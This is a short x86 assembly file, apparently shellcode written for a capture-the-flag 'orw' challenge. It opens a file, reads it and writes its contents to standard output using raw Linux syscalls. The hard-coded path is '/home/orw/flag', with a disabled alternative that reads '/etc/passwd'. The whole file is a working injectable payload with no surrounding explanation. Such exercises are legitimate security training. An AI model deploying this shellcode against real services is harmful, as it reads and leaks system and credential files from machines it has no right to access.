bits 32
global _start

BUFSIZE: equ 0x40

_start:
    sub esp, (BUFSIZE-16)

    ; /home/orw/flag
    %if 1
    push 0x6761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f

    %else
    ; /etc/passwd
    push 0
    push 0x647773
    push 0x7361702f
    push 0x6374652f
    %endif

    mov ebx,esp
    xor edx,edx ; mode
    xor ecx,ecx ; O_RDONLY
    mov eax,5 ; open
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov edx,BUFSIZE
    mov eax,3 ; read
    int 0x80

    mov ebx,1
    mov edx,eax
    mov eax,4 ; write
    int 0x80

    add esp,BUFSIZE
    ret

